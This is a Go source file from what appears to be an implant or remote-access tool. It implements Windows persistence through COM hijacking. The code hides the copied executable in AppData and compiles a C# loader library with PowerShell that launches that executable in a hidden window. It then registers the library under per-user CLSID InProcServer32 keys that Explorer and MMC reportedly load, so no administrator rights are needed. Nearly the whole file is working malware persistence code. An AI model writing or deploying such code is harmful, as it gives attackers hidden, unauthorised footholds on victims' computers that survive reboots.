//go:build windows && persist_comhijack
// +build windows,persist_comhijack

package persistence

import (
	"fmt"
	"os"
	"path/filepath"
	"strings"

	"golang.org/x/sys/windows/registry"
)

func init() {
	persistInstallFns = append(persistInstallFns, installCOMHijack)
	persistUninstallFns = append(persistUninstallFns, uninstallCOMHijack)
}

// These CLSIDs are loaded by common Windows apps and missing from HKCU,
// making them safe hijack targets that don't require admin.
var comHijackTargets = []struct {
	clsid   string
	dllName string
}{
	// CLSID loaded by Explorer, missing from HKCU by default
	{"{BCDE0395-E52F-467C-8E3D-C4579291692E}", "mscoree_shim.dll"},
	// CLSID loaded by MMC
	{"{B5F8350B-0548-48B1-A6EE-88BD00B4A5E7}", "cscapi_shim.dll"},
}

const comHijackDLLTemplate = `[DllMain]
; Placeholder - real implementation requires CGO DLL build
`

func getCOMHijackDir() (string, error) {
	appDataDir := os.Getenv("APPDATA")
	if appDataDir == "" {
		return "", fmt.Errorf("APPDATA not set")
	}
	return filepath.Join(appDataDir, DefaultBinaryDir, "com"), nil
}

func installCOMHijack(exePath string) error {
	targetPath, err := getAppDataTargetPath()
	if err != nil {
		return err
	}
	dir := filepath.Dir(targetPath)
	if err := os.MkdirAll(dir, 0755); err != nil {
		return fmt.Errorf("comhijack: failed to create dir: %w", err)
	}
	tryHideDirectory(dir)
	if !strings.EqualFold(filepath.Clean(exePath), filepath.Clean(targetPath)) {
		if err := replaceExecutable(exePath, targetPath); err != nil {
			return err
		}
	}

	comDir, err := getCOMHijackDir()
	if err != nil {
		return err
	}
	if err := os.MkdirAll(comDir, 0700); err != nil {
		return fmt.Errorf("comhijack: failed to create com dir: %w", err)
	}
	tryHideDirectory(comDir)

	for _, target := range comHijackTargets {
		dllPath := filepath.Join(comDir, target.dllName)

		// Write a loader DLL via PowerShell (no CGO needed)
		safeDll := strings.ReplaceAll(dllPath, "'", "''")
		safeExe := strings.ReplaceAll(targetPath, "'", "''")
		script := fmt.Sprintf(
			`$code = @"
using System;
using System.Runtime.InteropServices;
public class Loader {
    [DllImport("kernel32.dll")] static extern IntPtr CreateThread(IntPtr a, uint b, IntPtr c, IntPtr d, uint e, IntPtr f);
    [DllImport("kernel32.dll")] static extern uint WaitForSingleObject(IntPtr h, uint ms);
    public static void Load() {
        System.Diagnostics.Process.Start(new System.Diagnostics.ProcessStartInfo('%s') { WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden });
    }
}
"@
Add-Type -TypeDefinition $code -Language CSharp -OutputAssembly '%s' -OutputType Library -ErrorAction SilentlyContinue`,
			safeExe, safeDll)

		if err := runPowerShell(script); err != nil {
			// Non-fatal: try next target
			continue
		}

		// Register in HKCU (no admin required)
		keyPath := fmt.Sprintf(`SOFTWARE\Classes\CLSID\%s\InProcServer32`, target.clsid)
		k, _, err := registry.CreateKey(registry.CURRENT_USER, keyPath, registry.SET_VALUE)
		if err != nil {
			continue
		}
		_ = k.SetStringValue("", dllPath)
		_ = k.SetStringValue("ThreadingModel", "Apartment")
		k.Close()
	}

	return nil
}

func uninstallCOMHijack() error {
	for _, target := range comHijackTargets {
		keyPath := fmt.Sprintf(`SOFTWARE\Classes\CLSID\%s`, target.clsid)
		_ = registry.DeleteKey(registry.CURRENT_USER, keyPath+`\InProcServer32`)
		_ = registry.DeleteKey(registry.CURRENT_USER, keyPath)
	}

	comDir, err := getCOMHijackDir()
	if err != nil {
		return nil
	}
	_ = os.RemoveAll(comDir)
	return nil
}
